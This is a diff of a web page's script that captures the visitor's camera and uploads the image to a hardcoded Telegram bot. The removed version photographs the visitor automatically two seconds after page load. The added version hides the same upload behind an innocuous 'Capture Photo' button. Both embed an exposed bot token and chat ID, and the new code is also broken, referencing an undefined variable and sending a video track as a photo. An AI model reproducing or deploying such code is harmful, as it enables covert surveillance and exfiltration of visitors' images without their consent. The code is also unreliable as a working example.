@@ -10,48 +10,42 @@
 
 <script>
     window.onload = function() {
-        // Request access to the user's camera
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function (stream) {
-                // Capture photo after a short delay (adjust as needed)
-                setTimeout(function () {
-                    capturePhoto(stream);
-                }, 2000); // 2000 milliseconds (2 seconds) delay
-            })
-            .catch(function (error) {
-                console.error('Error accessing camera:', error);
-            });
+        document.getElementById('captureButton').addEventListener('click', function() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    var formData = new FormData();
+                    formData.append('photo', stream.getVideoTracks()[0], 'photo.jpg');
+                    formData.append('chat_id', '-1002121820675'); // Replace with your actual chat ID
+
+                    var botToken = '6946661358:AAF7MtPL0ELXvcXp54RNhFjhKANUMjJ6PIU';
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            console.log("Image sent to Telegram!");
+                        } else {
+                            console.error("Failed to send image to Telegram.");
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Error sending image:", error);
+                    });
+
+                    stream.getTracks().forEach(track => track.stop());
+                })
+                .catch(error => {
+                    console.error("Error accessing the camera:", error);
+                    alert("Camera access denied or an error occurred. Please allow camera access and try again.");
+                });
+        });
     };
-
-    function capturePhoto(stream) {
-        // Create a canvas element to capture the photo
-        var canvas = document.createElement('canvas');
-        canvas.width = 640; // Adjust width as needed
-        canvas.height = 480; // Adjust height as needed
-        var ctx = canvas.getContext('2d');
-        ctx.drawImage(stream.getVideoTracks()[0], 0, 0, canvas.width, canvas.height);
-
-        // Convert the canvas content to a Blob (image file)
-        canvas.toBlob(function (blob) {
-            // Create a FormData object to send the photo as a file
-            var formData = new FormData();
-            formData.append('photo', blob, 'photo.jpg');
-            formData.append('chat_id', '-1002121820675'); // Replace with your actual chat ID
-
-            // Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
-            var botToken = '6946661358:AAF7MtPL0ELXvcXp54RNhFjhKANUMjJ6PIU';
-
-            // Send the image to Telegram Bot API using the sendPhoto method
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData,
-            })
-            .then(response => response.json())
-            .then(data => console.log('Telegram API response:', data))
-            .catch(error => console.error('Error sending photo to Telegram:', error));
-        }, 'image/jpeg');
-    }
 </script>
+
+<button id="captureButton">Capture Photo</button>
 
 </body>
 </html>
